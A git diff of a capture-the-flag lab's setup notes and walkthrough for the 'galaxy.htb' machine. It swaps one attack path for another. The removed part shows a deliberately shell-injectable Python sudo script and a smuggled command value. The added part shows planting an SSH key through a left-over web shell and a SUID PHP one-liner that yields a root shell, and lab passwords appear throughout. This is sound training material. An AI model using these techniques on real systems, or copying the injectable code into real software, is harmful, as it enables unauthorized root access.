@@ -12,14 +12,15 @@ Passwords:
 
 | User  | Password                            |
 | ----- | ----------------------------------- |
-| doston | Ab401c |
+| web | 1203a |
 | root  | root8618 |
 
 ### Key Processes
 
 1) SSH server on 22 port
 2) Apache2 server on 80 port which is vulnerable to http host header
-3) There is custom copy.sh file in doston user's home directory which is vulnerable to rce
+3) There is web shell in /developers directory
+4) php has suid bit permission
 
 ### Automation / Crons
 There is no automation
@@ -35,7 +36,6 @@ There is no docker
 ### Other
 
 1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>
-2) I specifically made doston user unable to see following directory and files: <br>/etc/passwd<br> /etc/shells/<br> /home (but can access it's own directory)<br> /var
 
 
 # Writeup
@@ -79,90 +79,98 @@ Let's use proxy forwarding tool such as burp suite to manupulate and try this te
 
 
 `X-Forwarded-For: 127.0.0.1` header successfuly worked to bypass<br>
-![image](https://github.com/user-attachments/assets/c1ed7ece-f4d2-46d1-a9d2-8d07ddd472b6)
+![image](https://github.com/user-attachments/assets/3374c55f-ae55-45b0-9f02-3b87781a9c92)
+
 
 
 # Foothold
 
 We use same technique to see content of README.md file:<br>
-![image](https://github.com/user-attachments/assets/7533a024-0629-49f8-8040-4c65d5140d79)
+![image](https://github.com/user-attachments/assets/b3785047-9a54-42f9-99ba-cc7f56164d91)
 <br>
-Not much usefull let's take a look to devs.txt file<br>
-```
-user pass of developers who working to build this website
+Not much usefull let's take a look to web.php file<br>
+![image](https://github.com/user-attachments/assets/1ce77e27-b006-49be-b5fa-1f321d4f40e7)
 
-doston:Ab401c *
-john:sfheie32 
-mark:dfgid23 
-akmal:shgj62
-```
 <br>
-Now we have credentials let's try doston user to login with ssh<br>
+It looks like developers left webshell in developers directory, it is because web site hasn't been finished fully yet<br>
+We can copy our own id_rsa.pub (publick key) to web users authorize_keys to login via ssh without a password
 
-![image](https://github.com/user-attachments/assets/afb30792-72f1-4ba8-9bcb-2b82cd112ed4)
+```
+echo "public key" > /home/web/.ssh/authorized_keys
+```
+
+
 <br>
-We are in! user flag can be found from /home/doston/user.txt <br>
-doston user has limited and restricted access which is not default. We can not enumerate web directory nor we can not know possible usernames for lateral movement.<br>
-![image](https://github.com/user-attachments/assets/1a9203e6-5794-4822-8575-e9d801120e3f)
+Let's login using our own ssh with id_rsa for more comfortable and stable shell. If you don't have id_rsa keys create using 
+
+<br>`ssh-keygen -t rsa`<br>
+
+````
+┌──(master㉿kali)-[~/.ssh]
+└─$ ssh -i id_rsa web@192.168.2.106
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-50-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Jan 24 02:47:24 AM UTC 2025
+
+  System load:  0.0               Processes:               105
+  Usage of /:   33.7% of 7.79GB   Users logged in:         0
+  Memory usage: 9%                IPv4 address for enp0s3: 192.168.2.106
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+Last login: Fri Jan 24 02:19:46 2025 from 192.168.2.107
+$ 
+````
+user flag can be found in web home directory.<br>
+
+# Privilege Escalation
+After a long enumeration files with suid bit permission worth to pay attention:
+
+````
+$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+-rwsr-xr-x+ 1 root root 5779920 Dec  2 12:36 /usr/bin/php8.3
+-rwsr-xr-x 1 root root 72792 May 30  2024 /usr/bin/chfn
+-rwsr-xr-x 1 root root 277936 Apr  8  2024 /usr/bin/sudo
+-rwsr-xr-x+ 1 root root 137776 Apr  8  2024 /usr/bin/diff
+-rwsr-xr-x 1 root root 51584 Aug  9 02:33 /usr/bin/mount
+-rwsr-xr-x 1 root root 55680 Aug  9 02:33 /usr/bin/su
+-rwsr-xr-x 1 root root 40664 May 30  2024 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 76248 May 30  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 64152 May 30  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root root 39296 Aug  9 02:33 /usr/bin/umount
+-rwsr-xr-x 1 root root 44760 May 30  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root 39296 Apr  8  2024 /usr/bin/fusermount3
+-rwsr-xr-- 1 root messagebus 34960 Aug  9 02:33 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 18736 Apr  3  2024 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 163112 Oct 11 08:05 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 342632 Aug  9 02:33 /usr/lib/openssh/ssh-keysign
+````
+Because php has suid bit permission if we browse to gtfobins we can  escalate privilege:
 <br>
-But our user allowed to run copy.sh file as sudo without password:<br>
-`sudo -l`<br>
-```
-$ sudo -l
-Matching Defaults entries for doston on galaxy:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+![image](https://github.com/user-attachments/assets/ce6fe95d-27bc-4493-9627-fdedd8aeeeca)
 
-User doston may run the following commands on galaxy:
-    (ALL) NOPASSWD: /home/doston/copy.sh
-```
-Let's analyze content of copy.sh file:<br>
-```
-#!/usr/bin/python
-import os
-import shutil
-import stat
-import subprocess  
-
-def main():
-
-   
-    file_path = input("Enter the full path of the file to copy: ")
- 
-    target_dir = input("Enter full path of the directory to paste: ")
-
-
-   
-    if not file_path.startswith('/home/doston/'):
-        print("Error: Only files from /home/doston directory are allowed.")
-        return
-
-    
-    if os.path.islink(file_path):
-        print("Error: The file is a symlink and cannot be copied.")
-        return
-
-    
-    inode_count = os.stat(file_path).st_nlink
-    if inode_count > 1:
-        print("Error: The file is a hard link and cannot be copied.")
-        return
-
-    try:
-        
-        print(f"Attempting to copy the file from {file_path} to {target_dir}")
-       
-        subprocess.run(f"cp {file_path} {target_dir}", shell=True, check=True)
-        print(f"File successfully copied to {target_dir}.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error: Failed to copy the file. {e}")
-
-if __name__ == "__main__":
-    main()
-```
-This script written python code which asks file and location to copy if we look at it it uses shell and os commands to copy file which is dangerous !<br>
-Take a look at this part:
-`subprocess.run(f"cp {file_path} {target_dir}", shell=True, check=True)`
-This line of code uses shell to copy file with `cp` command but it is vulnerable to remote code execution!<br>
-When script asks target directory to copy file we can add extra command after directory like:<br>
-`/tmp && cat /root/root.txt` and we have root flag!
-
+````
+$ /usr/bin/php8.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+# id
+uid=1004(web) gid=1004(web) euid=0(root) groups=1004(web)
+# whoami
+root
+#
+````
+Now we have root shell, root flag can be found in /root directory
